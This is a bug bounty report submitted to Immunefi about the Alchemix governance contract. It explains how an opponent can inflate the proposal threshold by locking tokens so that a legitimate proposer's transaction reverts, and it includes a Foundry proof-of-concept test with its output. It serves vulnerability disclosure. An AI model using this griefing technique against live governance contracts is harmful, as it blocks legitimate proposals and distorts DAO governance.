# 30685 - \[SC - Medium] The proposer can be impeded from submitting a p...

Submitted on May 4th 2024 at 13:33:54 UTC by @OxG0P1 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30685

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

The `propose` function verifies the minimum votes required for a valid proposal by checking if the number of votes obtained by `_msgSender()` within the last block timestamp is greater than or equal to the current `proposalThreshold()` value. However, it is susceptible to exploitation by an attacker who can manipulate and inflate the `proposalThreshold()` value, thereby preventing any user from successfully proposing a valid proposal.

## Vulnerability Details

In the `propose` function, there exists a verification mechanism ensuring that the `msg.sender` possesses adequate quorum votes to initiate a proposal, denoted by the condition `getVotes(_msgSender(), block.timestamp - 1) >= proposalThreshold()`. Here, the `getVotes()` function retrieves the number of votes at `block.timestamp - 1`, while the `proposalThreshold()` is calculated as follows: `(token.getPastTotalSupply(block.timestamp) * proposalNumerator) / PROPOSAL_DENOMINATOR`. Notably, `getPastTotalSupply()` fetches the `totalSupply` at the specified `block.timestamp`.

Consider the following hypothetical scenario:

1. Bob intends to propose a proposal.
2. At timestamp `x`, Bob garners 110 votes.
3. At timestamp `x + 1`, the actual `proposalThreshold` is set at 100 votes.
4. However, Alice opposes Bob's proposal.
5. Alice manipulates the `proposalThreshold` by either locking or depositing assets into an already locked position, thereby ensuring that `getVotes(bob, x) < proposalThreshold()`. Consequently, Bob's proposal transaction fails, leading to a revert.

This scenario underscores a vulnerability where an adversary, in this case, Alice, exploits the system by artificially inflating the `proposalThreshold`, effectively obstructing legitimate proposals such as Bob's from succeeding.

## Impact Details

Opposing an user from proposing by manipulating the `totalSupply`

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/AlchemixGovernor.sol#L45-L47> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/governance/L2Governor.sol#L309-L312>

## Proof of Concept

`Test :`

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";
import "forge-std/console.sol";

contract AlchemixGovernorTest is BaseTest {
    uint256 tokenId1;
    uint256 tokenId2;
    uint256 tokenId3;

    function setUp() public {
        setupContracts(block.timestamp);

        
        tokenId1 = createVeAlcx(admin, TOKEN_100K / 4, MAXTIME, false); //Assign Admin with some voting power at block.timestamp

    

        
        hevm.warp(block.timestamp + 1); // Timestamp increment

        assertEq(governor.timelock(), address(timelockExecutor));
    }

    function craftTestProposal()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {
        targets = new address[](1);
        targets[0] = address(voter);
        values = new uint256[](1);
        values[0] = 0;
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(voter.whitelist.selector, usdc);
        description = "Whitelist USDC";
    }




    function testPropose() public {
        address beef2 = address(6);
        address beef3 = address(7);
        address beef4 = address(8);
        address beef5 = address(9);
        address beef6 = address(10);
        address beef7 = address(11);
        createVeAlcx(beef, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef2, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef3, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false);
        createVeAlcx(beef4, TOKEN_100K, MAXTIME, false); //Locking tokens so that the threshold increses

        ThreshHold = governor.proposalThreshold();
        console.log("TOTAL AT THIS2", ThreshHold);
        hevm.startPrank(admin);

        uint256 adminVotes = governor.getVotes(admin, block.timestamp - 1);
        uint256 pastVotes = veALCX.getPastVotes(admin, block.timestamp - 1);
        console.log("ADMIN VOTES", adminVotes);
        console.log("PAST VOTES", pastVotes);
        assertEq(adminVotes, pastVotes, "governor and veALCX calculated different votes");

        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();
        governor.propose(t, v, c, d, MAINNET); //Admin proposing 

        hevm.stopPrank();
    }
}
```

`Result :`

```solidity
Ran 2 tests for src/test/AlchemixGovernor.t.sol:AlchemixGovernorTest
[FAIL. Reason: revert: Governor: veALCX power below proposal threshold] testPropose() (gas: 7860929)
[PASS] testProposeFail() (gas: 1750584)
Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 103.69s (14.80s CPU time)

Ran 1 test suite in 105.70s (103.69s CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in src/test/AlchemixGovernor.t.sol:AlchemixGovernorTest
[FAIL. Reason: revert: Governor: veALCX power below proposal threshold] testPropose() (gas: 7860929)
```
